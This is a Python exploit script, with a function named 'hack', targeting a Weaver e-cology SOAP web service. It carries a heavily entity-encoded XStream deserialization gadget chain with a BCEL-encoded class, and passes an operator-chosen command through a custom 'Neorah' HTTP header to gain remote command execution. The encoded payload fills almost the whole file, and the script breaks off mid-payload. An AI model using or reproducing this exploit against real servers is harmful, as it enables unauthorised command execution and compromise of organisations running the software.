#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import sys

def hack(url,cmd):
    headers = {"Content-Type": "text/xml","Neorah":cmd}
    evilClass = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>    <web:string>
&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#99;&#117;&#115;&#116;&#111;&#109;&#39;&#62;&#32;&#60;&#117;&#110;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#98;&#108;&#101;&#45;&#112;&#97;&#114;&#101;&#110;&#116;&#115;&#47;&#62;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#32;&#60;&#115;&#105;&#122;&#101;&#62;&#50;&#60;&#47;&#115;&#105;&#122;&#101;&#62;&#32;&#60;&#99;&#111;&#109;&#112;&#97;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#102;&#120;&#46;&#99;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#46;&#79;&#98;&#115;&#101;&#114;&#118;&#97;&#98;&#108;&#101;&#76;&#105;&#115;&#116;&#36;&#49;&#39;&#47;&#62;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#32;&#60;&#105;&#110;&#116;&#62;&#51;&#60;&#47;&#105;&#110;&#116;&#62;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#32;&#60;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#32;&#60;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#119;&#115;&#46;&#101;&#110;&#99;&#111;&#100;&#105;&#110;&#103;&#46;&#120;&#109;&#108;&#46;&#88;&#77;&#76;&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#36;&#88;&#109;&#108;&#68;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#39;&#62;&#32;&#60;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#116;&#101;&#120;&#116;&#47;&#112;&#108;&#97;&#105;&#110;&#60;&#47;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#32;&#60;&#105;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#83;&#101;&#113;&#117;&#101;&#110;&#99;&#101;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#32;&#60;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#120;&#46;&#115;&#119;&#105;&#110;&#103;&#46;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#36;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#69;&#110;&#117;&#109;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#32;&#60;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#116;&#111;&#111;&#108;&#115;&#46;&#106;&#97;&#118;&#97;&#99;&#46;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#46;&#74;&#97;&#118;&#97;&#99;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#69;&#110;&#118;&#105;&#114;&#111;&#110;&#109;&#101;&#110;&#116;&#36;&#78;&#97;&#109;&#101;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#73;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#32;&#60;&#110;&#97;&#109;&#101;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#98;&#115;&#116;&#114;&#97;&#99;&#116;&#76;&#105;&#115;&#116;&#36;&#73;&#116;&#114;&#39;&#62;&#32;&#60;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#48;&#60;&#47;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#32;&#60;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#45;&#49;&#60;&#47;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#32;&#60;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#32;&#60;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#114;&#114;&#97;&#121;&#115;&#36;&#65;&#114;&#114;&#97;&#121;&#76;&#105;&#115;&#116;&#39;&#62;&#32;&#60;&#97;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#45;&#97;&#114;&#114;&#97;&#121;&#39;&#62;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#36;&#36;&#66;&#67;&#69;&#76;&#36;&#36;&#36;&#108;&#36;&#56;&#98;&#36;&#73;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#56;&#100;&#86;&#105;&#119;&#36;&#84;&#85;&#36;&#89;&#36;&#55;&#101;&#36;&#97;&#54;&#73;&#36;&#51;&#97;&#36;&#100;&#51;&#36;&#101;&#57;&#36;&#57;&#52;&#36;&#57;&#54;&#36;&#57;&#52;&#66;&#36;&#99;&#51;&#36;&#97;&#50;&#69;&#36;&#70;&#82;&#36;&#97;&#48;&#36;&#122;&#36;&#56;&#56;&#36;&#104;&#36;&#118;&#36;&#111;&#36;&#98;&#53;&#36;&#97;&#53;&#36;&#67;&#36;&#97;&#54;&#101;&#73;&#36;&#122;&#36;&#98;&#50;&#36;&#117;&#78;&#36;&#97;&#55;&#36;&#98;&#55;&#36;&#99;&#100;&#36;&#100;&#48;&#100;&#36;&#115;&#36;&#99;&#99;&#76;&#36;&#100;&#97;&#90;&#113;&#36;&#99;&#55;&#36;&#53;&#100;&#36;&#85;&#119;&#36;&#82;&#36;&#102;&#53;&#36;&#57;&#98;&#36;&#56;&#55;&#36;&#101;&#51;&#55;&#36;&#102;&#100;&#36;&#83;&#56;&#114;&#36;&#102;&#52;&#112;&#36;&#56;&#101;&#36;&#55;&#101;&#80;&#36;&#55;&#102;&#36;&#57;&#52;&#36;&#102;&#56;&#36;&#100;&#99;&#36;&#121;&#36;&#98;&#53;&#105;&#36;&#67;&#36;&#100;&#56;&#115;&#122;&#103;&#36;&#101;&#101;&#36;&#55;&#98;&#36;&#57;&#102;&#119;&#36;&#55;&#100;&#36;&#100;&#101;&#36;&#102;&#98;&#78;&#36;&#102;&#101;&#36;&#102;&#101;&#36;&#101;&#55;&#36;&#57;&#55;&#36;&#100;&#102;&#36;&#65;&#36;&#51;&#99;&#36;&#56;&#52;&#36;&#101;&#102;&#117;&#52;&#36;&#101;&#49;&#105;&#36;&#106;&#73;&#36;&#56;&#99;&#36;&#99;&#56;&#101;&#84;&#36;&#99;&#51;&#97;&#36;&#106;&#71;&#112;&#84;&#36;&#99;&#51;&#49;&#36;&#86;&#36;&#118;&#36;&#106;&#36;&#119;&#36;&#99;&#54;&#84;&#36;&#51;&#99;&#36;&#97;&#51;&#99;&#36;&#105;&#36;&#99;&#55;&#36;&#114;&#36;&#102;&#50;&#89;&#36;&#118;&#57;&#36;&#97;&#49;&#36;&#101;&#49;&#36;&#97;&#52;&#36;&#55;&#99;&#36;&#57;&#101;&#36;&#100;&#50;&#113;&#36;&#103;&#36;&#99;&#102;&#36;&#99;&#57;&#36;&#101;&#53;&#121;&#36;&#78;&#103;&#84;&#36;&#98;&#99;&#36;&#97;&#48;&#36;&#99;&#49;&#36;&#100;&#52;&#36;&#82;&#36;&#99;&#53;&#36;&#56;&#52;&#36;&#71;&#75;&#36;&#99;&#53;&#36;&#97;&#52;&#36;&#71;&#36;&#97;&#49;&#98;&#74;&#36;&#99;&#55;&#52;&#36;&#100;&#50;&#114;&#36;&#98;&#49;&#117;&#36;&#57;&#99;&#36;&#99;&#53;&#36;&#56;&#99;&#36;&#56;&#101;&#78;&#100;&#52;&#100;&#36;&#101;&#53;&#36;&#100;&#51;&#36;&#57;&#49;&#36;&#56;&#98;&#36;&#120;&#36;&#57;&#55;&#36;&#57;&#99;&#36;&#56;&#54;&#115;&#36;&#119;&#36;&#51;&#99;&#36;&#106;&#36;&#102;&#55;&#36;&#99;&#49;&#87;&#36;&#82;&#36;&#117;&#104;&#36;&#100;&#99;&#99;&#36;&#51;&#98;&#118;&#36;&#98;&#48;&#87;&#65;&#36;&#117;&#36;&#100;&#101;&#36;&#51;&#100;&#36;&#97;&#101;&#36;&#109;&#36;&#51;&#99;&#36;&#101;&#56;&#78;&#36;&#75;&#36;&#70;&#36;&#97;&#100;&#73;&#36;&#100;&#98;&#36;&#82;&#36;&#97;&#51;&#36;&#102;&#57;&#36;&#101;&#99;&#36;&#56;&#52;&#36;&#102;&#48;&#36;&#99;&#54;&#36;&#99;&#99;&#36;&#56;&#57;&#36;&#77;&#36;&#114;&#36;&#100;&#49;&#36;&#97;&#52;&#107;&#36;&#57;&#57;&#36;&#57;&#57;&#113;&#36;&#100;&#51;&#36;&#98;&#51;&#36;&#101;&#53;&#36;&#98;&#101;&#36;&#111;&#36;&#77;&#36;&#97;&#99;&#36;&#57;&#99;&#36;&#101;&#102;&#90;&#51;&#36;&#111;&#36;&#109;&#36;&#55;&#101;&#102;&#48;&#99;&#36;&#36;&#36;&#121;&#36;&#117;&#88;&#36;&#57;&#57;&#36;&#51;&#99;&#107;&#36;&#99;&#101;&#36;&#57;&#97;&#36;&#55;&#100;&#36;&#90;&#36;&#100;&#51;&#36;&#57;&#57;&#36;&#101;&#101;&#36;&#97;&#51;&#36;&#99;&#56;&#36;&#102;&#55;&#36;&#102;&#98;&#36;&#74;&#36;&#57;&#99;&#36;&#87;&#36;&#99;&#49;&#36;&#54;&#48;&#36;&#100;&#101;&#36;&#102;&#51;&#36;&#56;&#52;&#36;&#84;&#36;&#105;&#36;&#84;&#36;&#101;&#55;&#36;&#102;&#50;&#36;&#99;&#50;&#36;&#80;&#70;&#36;&#85;&#36;&#97;&#99;&#36;&#53;&#100;&#36;&#67;&#36;&#102;&#52;&#36;&#99;&#52;&#84;&#70;&#88;&#65;&#36;&#100;&#102;&#36;&#56;&#56;&#36;&#73;&#36;&#100;&#50;&#36;&#101;&#101;&#36;&#113;&#53;&#86;&#88;&#85;&#112;&#36;&#90;&#36;&#99;&#48;&#36;&#55;&#102;&#36;&#101;&#56;&#36;&#99;&#51;&#36;&#84;&#103;&#36;&#74;&#36;&#115;&#74;&#36;&#57;&#57;&#82;&#36;&#81;&#36;&#97;&#98;&#99;&#102;&#36;&#100;&#56;&#36;&#87;&#36;&#90;&#105;&#69;&#36;&#102;&#51;&#36;&#56;&#52;&#36;&#57;&#102;&#115;&#36;&#106;&#36;&#57;&#102;&#36;&#98;&#49;&#36;&#101;&#97;&#36;&#77;&#36;&#101;&#49;&#36;&#98;&#56;&#103;&#36;&#72;&#36;&#99;&#50;&#36;&#97;&#51;&#107;&#101;&#78;&#65;&#36;&#53;&#98;&#73;&#36;&#99;&#102;&#118;&#36;&#102;&#98;&#74;&#36;&#101;&#50;&#36;&#102;&#101;&#36;&#83;&#36;&#101;&#54;&#36;&#56;&#48;&#48;&#36;&#116;&#36;&#56;&#98;&#36;&#57;&#56;&#36;&#57;&#48;&#36;&#57;&#53;&#36;&#57;&#100;&#36;&#97;&#99;&#118;&#36;&#57;&#98;&#36;&#75;&#36;&#51;&#99;&#36;&#100;&#98;&#36;&#57;&#57;&#36;&#57;&#54;&#110;&#36;&#55;&#100;&#36;&#70;&#36;&#101;&#100;&#36;&#97;&#53;&#36;&#56;&#51;&#36;&#55;&#99;&#36;&#54;&#48;&#103;&#36;&#102;&#97;&#82;&#36;&#57;&#54;&#36;&#101;&#57;&#56;&#69;&#36;&#76;&#36;&#57;&#49;&#89;&#36;&#100;&#51;&#36;&#100;&#98;&#36;&#98;&#57;&#83;&#65;&#36;&#99;&#55;&#36;&#83;&#36;&#98;&#53;&#36;&#102;&#100;&#36;&#102;&#51;&#36;&#57;&#54;&#36;&#99;&#56;&#36;&#70;&#36;&#98;&#54;&#36;&#101;&#98;&#36;&#102;&#48;&#36;&#51;&#99;&#36;&#105;&#36;&#97;&#52;&#109;&#36;&#119;&#36;&#101;&#98;&#36;&#99;&#57;&#36;&#102;&#100;&#36;&#98;&#51;&#118;&#102;&#36;&#99;&#99;&#36;&#99;&#98;&#36;&#76;&#36;&#99;&#97;&#90;&#82;&#36;&#56;&#49;&#105;&#36;&#99;&#100;&#36;&#56;&#99;&#36;&#57;&#56;&#36;&#98;&#57;&#98;&#85;&#36;&#99;&#57;&#36;&#75;&#36;&#102;&#98;&#65;&#69;&#36;&#57;&#101;&#36;&#100;&#100;&#36;&#97;&#48;&#98;&#36;&#57;&#54;&#100;&#36;&#57;&#51;&#97;&#36;&#100;&#50;&#75;&#36;&#100;&#54;&#36;&#97;&#56;&#36;&#57;&#55;&#114;&#36;&#102;&#51;&#36;&#57;&#101;&#36;&#114;&#36;&#56;&#54;&#109;&#89;&#36;&#102;&#100;&#36;&#57;&#54;&#36;&#56;&#97;&#36;&#56;&#100;&#36;&#53;&#101;&#36;&#101;&#57;&#36;&#99;&#98;&#36;&#99;&#48;&#36;&#115;&#108;&#86;&#49;&#103;&#36;&#54;&#48;&#36;&#107;&#36;&#95;&#36;&#103;&#88;&#36;&#99;&#48;&#75;&#36;&#75;&#36;&#98;&#54;&#88;&#110;&#36;&#98;&#54;&#36;&#100;&#55;&#50;&#36;&#102;&#51;&#86;&#36;&#100;&#97;&#36;&#101;&#100;&#117;&#68;&#48;&#36;&#101;&#55;&#122;&#51;&#36;&#98;&#100;&#36;&#90;&#36;&#100;&#98;&#36;&#80;&#36;&#56;&#52;&#36;&#100;&#51;&#36;&#51;&#98;&#102;&#36;&#101;&#53;&#82;&#36;&#56;&#98;&#36;&#99;&#99;&#36;&#97;&#57;&#56;&#111;&#36;&#101;&#48;&#101;&#36;&#98;&#99;&#66;&#36;&#102;&#50;&#106;&#36;&#56;&#56;&#98;&#51;&#36;&#121;&#36;&#101;&#51;&#36;&#100;&#51;&#36;&#99;&#48;&#36;&#97;&#98;&#120;&#36;&#56;&#100;&#36;&#102;&#53;&#36;&#53;&#98;&#36;&#99;&#101;&#36;&#72;&#99;&#54;&#36;&#102;&#48;&#36;&#51;&#97;&#36;&#100;&#101;&#48;&#36;&#102;&#48;&#36;&#115;&#36;&#36;&#36;&#89;&#120;&#36;&#76;&#36;&#88;&#36;&#97;&#56;&#36;&#55;&#98;&#36;&#97;&#54;&#36;&#99;&#50;&#36;&#99;&#48;&#36;&#98;&#48;&#105;&#36;&#98;&#49;&#36;&#98;&#48;&#36;&#71;&#36;&#100;&#101;&#36;&#99;&#54;&#36;&#51;&#98;&#76;&#36;&#99;&#98;&#36;&#99;&#48;&#36;&#98;&#98;&#120;&#36;&#99;&#102;&#36;&#99;&#48;&#36;&#102;&#98;&#36;&#102;&#56;&#36;&#52;&#48;&#65;&#36;&#100;&#51;&#36;&#111;&#51;&#36;&#97;&#52;&#36;&#98;&#100;&#36;&#57;&#97;&#36;&#84;&#36;&#70;&#36;&#102;&#49;&#67;&#121;&#36;&#51;&#102;&#36;&#101;&#56;&#36;&#57;&#97;&#114;&#36;&#98;&#100;&#36;&#97;&#101;&#36;&#112;&#36;&#56;&#99;&#36;&#56;&#57;&#36;&#102;&#49;&#108;&#36;&#101;&#102;&#36;&#97;&#97;&#36;&#102;&#102;&#103;&#36;&#101;&#48;&#67;&#36;&#53;&#99;&#36;&#121;&#36;&#90;&#36;&#120;&#81;&#88;&#36;&#86;&#97;&#36;&#56;&#57;&#36;&#51;&#97;&#36;&#98;&#54;&#36;&#102;&#98;&#36;&#97;&#56;&#112;&#36;&#51;&#100;&#51;&#36;&#99;&#100;&#68;&#107;&#36;&#100;&#56;&#83;&#36;&#102;&#49;&#36;&#57;&#49;&#36;&#56;&#49;&#36;&#56;&#102;&#113;&#36;&#99;&#57;&#36;&#99;&#48;&#36;&#116;&#36;&#102;&#56;&#84;&#36;&#99;&#53;&#103;&#36;&#71;&#36;&#51;&#101;&#36;&#99;&#55;&#36;&#88;&#36;&#98;&#50;&#36;&#97;&#97;&#95;&#36;&#119;&#104;&#56;&#36;&#51;&#100;&#36;&#54;&#48;&#36;&#101;&#48;&#36;&#120;&#36;&#55;&#99;&#109;&#36;&#101;&#48;&#50;&#36;&#98;&#101;&#49;&#112;&#36;&#70;&#36;&#100;&#102;&#36;&#119;&#36;&#65;&#36;&#55;&#98;&#36;&#97;&#48;&#36;&#79;&#36;&#99;&#57;&#36;&#71;&#36;&#98;&#101;&#36;&#99;&#51;&#102;&#118;&#36;&#53;&#101;&#36;&#56;&#53;&#36;&#105;&#36;&#70;&#36;&#57;&#100;&#36;&#98;&#55;&#107;&#115;&#36;&#70;&#107;&#110;&#36;&#100;&#51;&#36;&#98;&#97;&#85;&#36;&#98;&#49;&#36;&#56;&#102;&#36;&#97;&#53;&#36;&#51;&#100;&#36;&#115;&#68;&#36;&#98;&#101;&#36;&#99;&#98;&#87;&#36;&#97;&#50;&#36;&#98;&#50;&#95;&#36;&#86;&#36;&#101;&#102;&#78;&#36;&#36;&#71;&#36;&#98;&#49;&#36;&#57;&#100;&#36;&#51;&#97;&#36;&#113;&#36;&#56;&#53;&#36;&#36;&#107;&#53;&#36;&#108;&#36;&#85;&#36;&#101;&#57;&#74;&#36;&#98;&#97;&#36;&#97;&#53;&#106;&#36;&#99;&#52;&#36;&#97;&#97;&#36;&#101;&#48;&#75;&#36;&#56;&#101;&#36;&#97;&#52;&#78;&#36;&#100;&#100;&#36;&#68;&#86;&#51;&#36;&#99;&#51;&#36;&#57;&#55;&#36;&#97;&#50;&#68;&#36;&#99;&#49;&#36;&#97;&#54;&#120;&#36;&#101;&#100;&#85;&#36;&#97;&#56;&#36;&#98;&#49;&#36;&#100;&#56;&#95;&#98;&#36;&#97;&#48;&#36;&#57;&#50;&#36;&#100;&#102;&#36;&#98;&#101;&#36;&#51;&#97;&#36;&#51;&#97;&#36;&#97;&#55;&#106;&#116;&#36;&#98;&#97;&#36;&#101;&#102;&#52;&#36;&#73;&#36;&#103;&#109;&#103;&#36;&#100;&#54;&#36;&#57;&#100;&#97;&#36;&#90;&#119;&#36;&#99;&#55;&#107;&#36;&#116;&#36;&#99;&#48;&#36;&#97;&#57;&#90;&#81;&#119;&#36;&#98;&#100;&#57;&#36;&#97;&#49;&#36;&#99;&#57;&#36;&#57;&#97;&#36;&#57;&#52;&#36;&#100;&#50;&#104;&#36;&#97;&#102;&#36;&#122;&#36;&#56;&#51;&#36;&#98;&#99;&#36;&#56;&#51;&#36;&#69;&#36;&#97;&#52;&#36;&#102;&#50;&#57;&#36;&#101;&#49;&#89;&#36;&#114;&#84;&#36;&#104;&#36;&#102;&#55;&#67;&#36;&#56;&#50;&#36;&#104;&#79;&#76;&#36;&#57;&#54;&#36;&#90;&#36;&#101;&#57;&#36;&#98;&#57;&#75;&#36;&#102;&#101;&#36;&#99;&#98;&#103;&#79;&#36;&#56;&#98;&#36;&#95;&#36;&#56;&#50;&#36;&#66;&#36;&#99;&#98;&#36;&#83;&#36;&#98;&#101;&#111;&#36;&#88;&#36;&#56;&#55;&#101;&#56;&#36;&#55;&#101;&#82;&#78;&#36;&#100;&#56;&#36;&#81;&#36;&#122;&#36;&#120;&#36;&#100;&#56;&#36;&#53;&#99;&#36;&#116;&#36;&#57;&#57;&#36;&#98;&#97;&#36;&#57;&#49;&#71;&#36;&#101;&#54;&#36;&#101;&#52;&#69;&#36;&#109;&#67;&#36;&#102;&#53;&#36;&#98;&#99;&#36;&#56;&#102;&#87;&#36;&#102;&#97;&#36;&#98;&#56;&#36;&#117;&#36;&#51;&#100;&#36;&#57;&#54;&#119;&#36;&#67;&#36;&#51;&#98;&#36;&#53;&#98;&#36;&#107;&#117;&#36;&#56;&#98;&#36;&#57;&#98;&#36;&#56;&#101;&#36;&#97;&#97;&#36;&#55;&#99;&#36;&#99;&#98;&#98;&#57;&#36;&#56;&#57;&#36;&#99;&#52;&#36;&#98;&#99;&#36;&#98;&#48;&#56;&#36;&#111;&#36;&#101;&#101;&#36;&#57;&#50;&#36;&#100;&#53;&#36;&#82;&#36;&#99;&#102;&#36;&#57;&#53;&#36;&#118;&#36;&#102;&#52;&#87;&#121;&#36;&#119;&#36;&#76;&#121;&#36;&#53;&#100;&#36;&#101;&#57;&#36;&#101;&#57;&#36;&#97;&#48;&#36;&#57;&#51;&#36;&#99;&#98;&#36;&#72;&#36;&#100;&#52;&#36;&#85;&#102;&#36;&#57;&#54;&#36;&#78;&#36;&#53;&#100;&#36;&#102;&#49;&#36;&#99;&#54;&#36;&#120;&#36;&#98;&#99;&#36;&#101;&#52;&#36;&#56;&#48;&#36;&#101;&#97;&#36;&#57;&#100;&#36;&#102;&#49;&#36;&#98;&#97;&#36;&#72;&#50;&#36;&#72;&#36;&#112;&#36;&#101;&#102;&#36;&#56;&#98;&#36;&#110;&#36;&#57;&#49;&#36;&#98;&#49;&#36;&#98;&#51;&#36;&#97;&#53;&#36;&#120;&#36;&#55;&#102;&#36;&#56;&#55;&#36;&#57;&#48;&#36;&#57;&#54;&#77;&#36;&#53;&#98;&#53;&#109;&#36;&#102;&#97;&#36;&#97;&#51;&#36;&#101;&#99;&#36;&#102;&#51;&#36;&#101;&#50;&#36;&#100;&#55;&#36;&#101;&#98;&#36;&#113;&#115;&#114;&#36;&#56;&#97;&#36;&#57;&#98;&#36;&#101;&#97;&#36;&#56;&#98;&#36;&#98;&#49;&#56;&#36;&#98;&#53;&#36;&#53;&#98;&#115;&#36;&#55;&#99;&#36;&#74;&#36;&#56;&#97;&#36;&#99;&#51;&#118;&#36;&#99;&#99;&#51;&#36;&#122;&#36;&#56;&#49;&#36;&#56;&#100;&#120;&#36;&#56;&#48;&#95;&#90;&#36;&#102;&#57;&#36;&#99;&#55;&#36;&#57;&#49;&#36;&#36;&#36;&#99;&#55;&#36;&#116;&#36;&#100;&#55;&#36;&#122;&#36;&#52;&#48;&#36;&#99;&#51;&#122;&#52;&#36;&#97;&#50;&#36;&#57;&#57;&#36;&#100;&#50;&#36;&#98;&#102;&#36;&#98;&#54;&#36;&#53;&#101;&#36;&#56;&#51;&#114;&#36;&#106;&#36;&#78;&#36;&#70;&#36;&#56;&#52;&#36;&#97;&#50;&#36;&#101;&#49;&#36;&#67;&#36;&#111;&#36;&#99;&#57;&#109;&#36;&#100;&#49;&#36;&#99;&#54;&#36;&#100;&#48;&#36;&#97;&#102;&#80;&#36;&#76;&#36;&#100;&#48;&#70;&#36;&#98;&#54;&#36;&#120;&#36;&#55;&#99;&#107;&#36;&#119;&#36;&#52;&#48;&#36;&#108;&#36;&#101;&#100;&#36;&#118;&#36;&#97;&#48;&#36;&#98;&#57;&#36;&#65;&#36;&#112;&#36;&#100;&#97;&#82;&#36;&#99;&#48;&#36;&#56;&#97;&#68;&#56;&#36;&#87;&#36;&#115;&#36;&#98;&#50;&#53;&#36;&#87;&#36;&#97;&#54;&#36;&#98;&#52;&#36;&#122;&#36;&#82;&#36;&#56;&#57;&#69;&#120;&#36;&#89;&#36;&#53;&#100;&#89;&#86;&#74;&#52;&#36;&#99;&#54;&#36;&#103;&#99;&#36;&#57;&#49;&#36;&#98;&#50;&#36;&#100;&#101;&#77;&#68;&#36;&#84;&#106;&#76;&#36;&#56;&#100;&#36;&#98;&#54;&#36;&#88;&#36;&#98;&#48;&#74;&#36;&#57;&#97;&#36;&#56;&#56;&#118;&#36;&#56;&#52;&#36;&#56;&#57;&#36;&#51;&#97;&#36;&#82;&#36;&#56;&#97;&#36;&#97;&#101;&#78;&#73;&#36;&#97;&#56;&#36;&#87;&#36;&#100;&#51;&#122;&#36;&#117;&#104;&#36;&#97;&#50;&#36;&#54;&#48;&#77;&#36;&#97;&#97;&#36;&#73;&#95;&#36;&#57;&#100;&#104;&#36;&#98;&#97;&#36;&#56;&#49;&#36;&#99;&#101;&#36;&#84;&#36;&#100;&#55;&#36;&#82;&#36;&#56;&#98;&#81;&#36;&#55;&#102;&#109;&#36;&#66;&#36;&#101;&#98;&#36;&#97;&#101;&#97;&#36;&#55;&#100;&#116;&#67;&#36;&#66;&#36;&#102;&#55;&#36;&#113;&#36;&#102;&#52;&#36;&#57;&#56;&#36;&#103;&#36;&#100;&#51;&#36;&#76;&#36;&#98;&#56;&#36;&#102;&#55;&#50;&#36;&#57;&#97;&#36;&#101;&#53;&#36;&#98;&#51;&#36;&#101;&#98;&#36;&#119;&#36;&#111;&#36;&#100;&#49;&#36;&#56;&#100;&#36;&#98;&#52;&#36;&#55;&#98;&#36;&#86;&#90;&#114;&#36;&#53;&#98;&#36;&#66;&#36;&#102;&#55;&#36;&#102;&#102;&#36;&#99;&#99;&#36;&#99;&#52;&#36;&#99;&#50;&#36;&#98;&#56;&#36;&#56;&#57;&#36;&#100;&#102;&#36;&#102;&#57;&#36;&#100;&#57;&#36;&#80;&#36;&#110;&#36;&#99;&#101;&#36;&#100;&#52;&#36;&#79;&#36;&#102;&#49;&#36;&#100;&#55;&#36;&#68;&#36;&#57;&#56;&#36;&#55;&#99;&#36;&#57;&#56;&#36;&#56;&#57;&#36;&#98;&#54;&#36;&#99;&#49;&#36;&#99;&#48;&#36;&#51;&#97;&#36;&#98;&#52;&#36;&#98;&#48;&#36;&#65;&#36;&#120;&#36;&#98;&#48;&#36;&#76;&#36;&#97;&#100;&#36;&#100;&#56;&#77;&#36;&#99;&#57;&#36;&#65;&#86;&#36;&#101;&#50;&#36;&#117;&#49;&#36;&#115;&#36;&#100;&#97;&#36;&#57;&#49;&#36;&#99;&#54;&#36;&#119;&#36;&#57;&#99;&#71;&#36;&#72;&#36;&#36;&#97;&#53;&#36;&#55;&#101;&#36;&#99;&#52;&#36;&#103;&#36;&#100;&#97;&#89;&#75;&#75;&#36;&#57;&#100;&#36;&#102;&#56;&#36;&#68;&#49;&#36;&#102;&#99;&#36;&#56;&#57;&#36;&#78;&#36;&#101;&#56;&#36;&#97;&#54;&#36;&#97;&#53;&#36;&#70;&#36;&#100;&#97;&#104;&#36;&#99;&#51;&#79;&#36;&#100;&#56;&#36;&#56;&#97;&#109;&#36;&#102;&#52;&#36;&#98;&#53;&#36;&#79;&#36;&#51;&#102;&#36;&#54;&#48;&#36;&#51;&#98;&#122;&#36;&#100;&#48;&#36;&#52;&#48;&#36;&#57;&#98;&#87;&#36;&#100;&#48;&#36;&#56;&#98;&#36;&#51;&#101;&#122;&#36;&#100;&#100;&#36;&#56;&#53;&#36;&#56;&#98;&#36;&#100;&#56;&#36;&#56;&#49;&#36;&#57;&#100;&#36;&#102;&#52;&#56;&#36;&#99;&#48;&#36;&#101;&#102;&#36;&#99;&#55;&#36;&#56;&#51;&#36;&#57;&#52;&#69;&#36;&#101;&#56;&#36;&#99;&#49;&#36;&#97;&#53;&#36;&#98;&#99;&#36;&#56;&#55;&#36;&#101;&#53;&#54;&#113;&#36;&#56;&#54;&#36;&#98;&#102;&#36;&#57;&#49;&#36;&#107;&#36;&#101;&#54;&#111;&#36;&#57;&#100;&#36;&#102;&#51;&#36;&#89;&#36;&#99;&#50;&#36;&#112;&#36;&#57;&#52;&#105;&#36;&#102;&#52;&#36;&#98;&#55;&#36;&#68;&#36;&#56;&#102;&#36;&#101;&#50;&#49;&#70;&#36;&#118;&#36;&#98;&#100;&#36;&#101;&#101;&#70;&#36;&#67;&#36;&#51;&#97;&#36;&#55;&#100;&#36;&#56;&#54;&#36;&#100;&#49;&#36;&#56;&#102;&#36;&#51;&#100;&#36;&#102;